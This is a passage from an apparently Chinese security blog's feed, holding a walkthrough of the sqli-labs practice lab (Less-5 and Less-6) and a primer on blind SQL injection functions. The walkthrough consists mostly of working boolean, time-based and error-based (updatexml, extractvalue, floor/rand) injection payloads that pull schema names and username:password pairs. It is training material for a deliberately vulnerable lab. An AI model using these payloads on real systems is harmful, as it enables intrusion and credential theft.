src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202223307482.png" alt="image-20220202223307482"></p><p>若数据库第一位大于a返回正常，如图1；若数据库第一位不大于s则返回异常，通常这样的情况需要从a~z每一个去判断，若回显异常，则就是数据库第一位字符。</p><p>得知第一位是s，猜第二位，这里判断前两位是否大于sa即可：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),2)&gt;&#39;sa&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里回显正常，表示第二位大于a</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202223948285.png" alt="image-20220202223948285"></p><p>从a开始一个一个去试，发现到e的时候回显异常，证明第二位字符是e。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),2)&gt;&#39;se&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202224036469.png" alt="image-20220202224036469"></p><p>剩下的字符根据得出的数据库的长度依次去猜每一位字符（这里可以写一个脚本去跑）</p><h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>利用ascii()和substr()函数猜测表名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里第一个表的第一个字符的ascii码&gt;100，回显正确</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202230834521.png" alt="image-20220202230834521"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;101 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>大于101时回显错误，根据acsii码表可知，101是e，所以第一张表的第一个字符是e。</p><p>（在实战当中，应该从a&#x3D;97开始猜测，一个一个去试）</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202231015624.png" alt="image-20220202231015624"></p><p>第二个字符通过substr(**,2,1)进行猜测，剩下的字符以此类推。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;108 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202231524818.png" alt="image-20220202231524818"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;109 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202231604072.png" alt="image-20220202231604072"></p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202230525691.png" alt="image-20220202230525691"></p><p><strong>获取剩下的表：</strong></p><p>上述的语句中使用的 limit 0,1； 意思就是从第 0 个开始，获取第一个。那要获取第二个就是limit 1,1</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;113 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回正常，表示第二张表的第一个字符&gt;113</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202232002600.png" alt="image-20220202232002600"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;114 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不大于114，证明第二张表的第一个字符是r，以后的过程就是不断的重复上面的。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202232109005.png" alt="image-20220202232109005"></p><h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p>利用 regexp 获取users表中的列：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^u[a-z]&#39; limit 0,1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面回显正常，判断出users表中有u开头的字段</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202234036314.png" alt="image-20220202234036314"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^w[a-z]&#39; limit 0,1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若无字符开头的字段，回显异常，如图：</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202234258789.png" alt="image-20220202234258789"></p><p>依次进行正表达式猜列的字段名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>猜测出字段名后要判断是否正确，直接判断 table_name &#x3D; ‘username’即可 。 </p><p>password字段同理。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202234646758.png" alt="image-20220202234646758"></p><p><strong>表达式更换如下：</strong></p><p><strong>‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE</strong></p><p><strong>（在更换到’^news[a-z]’这步时会报错，此时写news即可。）</strong></p><h2 id="0x06-1"><a href="#0x06-1" class="headerlink" title="0x06"></a>0x06</h2><p><strong>利用 ord()和 mid()函数获取 users表的内容</strong></p><p>IFNULL() 函数：用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。IFNULL(expression, alt_value)</p><p>CAST()函数：用于将某种数据类型的表达式显式转换为另一种数据类型。CAST()函数的参数是一个表达式，它包括用AS关键字分隔的源值和目标数据类型。</p><p>cast(username as char)：表示将username表达式转换为char类型。</p><p>ORD()：返回第一个字符的ASCII码。</p><p>ORDER BY 关键字默认按照升序对记录进行排序。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果返回正常，证明username字段中第一个用户名的第一个字符是D；接下来重复造轮子即可。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203001328114.png" alt="image-20220203001328114"></p><pre class="line-numbers language-none"><code class="language-none">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>代码解析：先从users表中查询到username字段，然后执行cast(username as char)，将字段username转换为char类型，如果没有username字段，ifnull()函数将返回0x20（这里如果返回0x20已经没什么意义了，不需要继续了），按照id升序的方式排列，之后执行mid()函数，将查询到的用户名从第1位开始截取长度为1的字符，然后在执行ord()函数，将截取的字符转换为acsii码与68进行比较。<strong>此处的0x20是十六进制的ascii，表示空格</strong></p><hr><h2 id="0x01（XPATH函数报错）"><a href="#0x01（XPATH函数报错）" class="headerlink" title="0x01（XPATH函数报错）"></a>0x01（XPATH函数报错）</h2><p>###updatexml(XML_document, XPath_string, new_value)</p><p>XML_document：是文档对象的名称</p><p>XPath_string：是XPath格式的字符串（<strong>如果XPath_string不是XPath格式，则会报错并显示出XPath_string的值）</strong></p><p>new_value：替换查找到的数据</p><p>XPath语法介绍:<a href="https://blog.csdn.net/dearbaba_8520/article/details/81557827">https://blog.csdn.net/dearbaba_8520/article/details/81557827</a></p><p>常用注入语句：</p><pre class="line-numbers language-none"><code class="language-none">updatexml(1,concat(1,payload),1)。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>concat()函数用于将多个字符串连接成一个字符串,目的是让拼接后的字符串不符合XPath格式使其报错,显示出要查的对象。</strong></p><p><strong>最终的目的是使其报错，至于拼接的值多种多样，并不局限于1。</strong></p><p>如图：</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203205634875.png" alt="image-20220203205634875"></p><h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>注入语句：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的<code>0x7eASCII是~</code>,<code>updatexml()</code>报错信息为特殊字符，字母及之后的内容，为了前面字母丢失，开头连接一个特殊字符~。（并不局限于0x7e）</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203210618677.png" alt="image-20220203210618677"></p><h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>爆版本号：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203211223581.png" alt="image-20220203211223581"></p><p>爆数据库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆列名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203212659594.png" alt="image-20220203212659594"></p><p>爆列名的时候用group_concat()函数没有爆出关键字段，这里需要控制<strong>limit 0,1</strong>爆出关键字段。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆出用户名：</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203212908733.png" alt="image-20220203212908733"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆出密码：</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203212946551.png" alt="image-20220203212946551"></p><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>这里同样需要控制limit字段爆出信息</strong></p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203213330601.png" alt="image-20220203213330601"></p><hr><h3 id="extractvalue-：从目标XML中返回包含所查询值的字符串。"><a href="#extractvalue-：从目标XML中返回包含所查询值的字符串。" class="headerlink" title="extractvalue()：从目标XML中返回包含所查询值的字符串。"></a>extractvalue()：从目标XML中返回包含所查询值的字符串。</h3><p>　　EXTRACTVALUE (XML_document, XPath_string);</p><p>　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>　　第二个参数：XPath_string (Xpath格式的字符串)</p><p><strong>payloaod:</strong></p><pre class="line-numbers language-none"><code class="language-none">and extractvalue(0x7e,concat(0x7e,(select @version()),0x7e));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>extractvalue注入的原理：依旧如同<code>updatexml</code>一样，extract的第二个参数要求是<strong>xpath格式字符</strong>串，而我们<strong>输入的并不是</strong>。所以报错</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203214242168.png" alt="image-20220203214242168"></p><p>后续过程如updatexml()相同。</p><hr><h2 id="0x01（时间盲注）"><a href="#0x01（时间盲注）" class="headerlink" title="0x01（时间盲注）"></a>0x01（时间盲注）</h2><p><strong>对于时间盲注，根据浏览器的反应，来猜测出数据库名，其实时间注入就是比布尔盲注多了一个<code>if函数</code>，<code>sleep()</code>函数就相当于布尔盲注中的<code>true或false</code>，其他语句大致都相同。</strong></p><h3 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a>sleep()函数</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(length(database())&gt;9,1,sleep(10)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>if(condition,true,false)&#x2F;若条件为真 返回true，若条件为假 返回false</strong></p><p>这里执行失败的话将睡10s。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203215718878.png" alt="image-20220203215718878"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(length(database())&gt;6,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行成功则会迅速返回结果。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203220032518.png" alt="image-20220203220032518"></p><p>爆数据库名：</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆列名：</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))))&gt;100,1,sleep(10))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆值：</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and  if((ascii(substr(( select username from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还是写个脚本跑一下方便啊！手工注效率低还容易出错啊！</p><hr><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>第六关根据源码判断出，双引号报错：</p><pre class="line-numbers language-none"><code class="language-none">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203221301023.png" alt="image-20220203221301023"></p><p>这一关的注入方式和第五关相同，只需要将 <code>&#39;</code> 变为 <code>&quot;</code> 即可</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select 1,count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220203222058885.png" alt="image-20220203222058885"></p><p>后续过程同Less-5。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-盲注</title>
      <link href="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"/>
      <url>/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="SQL盲注概述"><a href="#SQL盲注概述" class="headerlink" title="SQL盲注概述"></a>SQL盲注概述</h2><p><strong>盲注，通俗易懂一点，就是在页面没有提供明显信息的情况执行的注入方式。</strong></p><p>1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的          盲注来获取信息。<br>2.盲注是不能通过直接显示的途径来获取数据库数据的方法。</p><h2 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h2><p>1、布尔盲注</p><p>2、时间盲注</p><p>3、报错型盲注</p><h2 id="SQL盲注常用的函数"><a href="#SQL盲注常用的函数" class="headerlink" title="SQL盲注常用的函数"></a>SQL盲注常用的函数</h2><p>1、length()：返回字符串的长度</p><p>2、substr(string,start,length)：</p><ul><li>substr中的pos从1开始计数</li><li>substr中的len把当前位置当作第一个</li></ul><p>（第一个参数string为要处理的字符串，start为开始位置，length为截取的长度）</p><p>如图：截取字符串’abcde’，从第二个位置开始，截取长度为1的子串，为b。</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202152925950.png" alt="image-20220202152925950"></p><p><strong>举例：</strong></p><p>(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p><p>(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。</p><p>3、mid():用法与substr()完全相同。</p><p><strong>举例：</strong></p><p>（1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p><p>（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p><p>4、ascii()：查询ascii码中对应的值：</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202153644458.png" alt="image-20220202153644458"></p><p>5、count()：统计记录的数量：</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202154416535.png" alt="image-20220202154416535"></p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202154614895.png" alt="image-20220202154614895"></p><p>6、if(condition,a,b)：如果condition为true,返回a,否则返回b</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202154906058.png" alt="image-20220202154906058"></p><p>7、sleep()：延迟几秒</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202155029469.png" alt="image-20220202155029469"></p><p>8、left()：得到字符串左部指定个数的字符</p><p>left(string,n)：string为要截取的字符串，n为长度</p><p><strong>举例：</strong></p><p>(1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。</p><p>(2) 同样的string可以为自行构造的sql语句。</p><p>9、ORD()：返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p><p><strong>例如：</strong></p><p>ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p><p>10、regexp 正则注入：</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202160832282.png" alt="image-20220202160832282"></p><p>当正确的时候显示结果为 1，不正确的时候显示结果为0。</p><p><strong>示例介绍：</strong></p><pre class="line-numbers language-none"><code class="language-none"> I select * from users where id&#x3D;1 and 1&#x3D;(if((user() regexp &#39;^r&#39;),1,0)); II select * from users where id&#x3D;1 and 1&#x3D;(user() regexp&#39;^ri&#39;); 通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 于 0 或者 1 进行判断。 III select * from users where id&#x3D;1 and 1&#x3D;(select 1 from information_schema.tables where table_schema&#x3D;&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1); 这里利用 select 构造了一个判断语句。我们只需要更换 regexp 表达式即可 &#39;^u[a-z]&#39; -&gt; &#39;^us[a-z]&#39; -&gt; &#39;^use[a-z]&#39; -&gt; &#39;^user[a-z]&#39; -&gt; FALSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正则注入介绍：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p><p>11、like匹配注入：和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。</p><p>​        用法：select user() like ‘ro%’;结果正确返回1，错误返回0。</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202161357929.png" alt="image-20220202161357929"></p><p>12、floor()，其功能是“向下取整”，或者说“向下舍入”、“向零取舍”，即取不大于x的最大整数。其主要用于报错盲注中的函数。</p><p>13、rand函数：可以产生一个0–1之间的随机数；配合floor()构造 payload。当rand()有了参数之后，他会对所查询的每条数据产生一个随机数，但是从时间角度看每次给的随机数值是一样的，所以这个随机数是可以预测的，也叫伪随机数。如图：</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202163408808.png" alt="image-20220202163408808"></p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202163503270.png" alt="image-20220202163503270"></p><p>*<em>14、floor()配合rand()使用：floor(rand(1)<em>2)；</em></em></p><p><strong>rand()返回的是0到1之间的随机数，乘2是为了让他返回0到2之间的随机数，组合floor()的取整，这里返回的值只能是0和1；</strong></p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202163820155.png" alt="image-20220202163820155"></p><p>15、groud by：对数据进行分组。配合rand()和floor()使用。</p><p><img src="/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/image-20220202165654327.png" alt="image-20220202165654327"></p><p>16、<strong>updatexml() 函数</strong>：改变文档中符合条件的节点的值。<br>        Updatexml(xml_documnet,XPath_string,new_value)；<br>        第一个参数：XML_document是string格式，为XML文档对象的名称<br>        第二个参数：XPath_string(Xpath格式的字符串)<br>        第三个参数：new_value，string格式，替换查找到的符合条件的数据超过长度可以配合      substr()。</p><p>17、<strong>extractvalue()函数：</strong>配合updatexml() 进行时间盲注。</p><p>extractvalue (XML_document, XPath_string); </p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，<br>第二个参数：XPath_string (<a href="https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020">Xpath</a>格式的字符串).<br>作用：从目标XML中返回包含所查询值的字符串</p><hr><p>##基于布尔SQL盲注—-构造逻辑判断</p><p>布尔盲注主要基于返回的结果来来进行注入；</p><p>通常利用left()，ascii()，ORD()，regexp，like等数据库关键字根据返回的逻辑值去判断数据库或者其他字段的名字。</p><h2 id="基于报错的SQL盲注—-构造payload-让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注—-构造payload-让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注—-构造payload 让信息通过错误提示回显出来"></a>基于报错的SQL盲注—-构造payload 让信息通过错误提示回显出来</h2><p>通常利用concat()，floor()，rand()函数构造payload注入，爆出数据库名字或其他关键字段。</p><h2 id="基于时间的-SQL-盲注———-延时注入"><a href="#基于时间的-SQL-盲注———-延时注入" class="headerlink" title="基于时间的 SQL 盲注———-延时注入"></a>基于时间的 SQL 盲注———-延时注入</h2><p>原理：某些查询不需要返回结果的，仅判断查询语句是否正确执行即可，可以使用sleep来进行时间盲注，取页面执行时间(结束时间-开始时间)来判断sleep函数是否正常执行，所以其是否正常执行可以看到一个布尔值，正常为True 报错False。<strong>本质是利用插入的sql语句执行造成时间延迟</strong></p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-文件读写操作</title>
      <link href="/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/"/>
      <url>/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/</url>
      
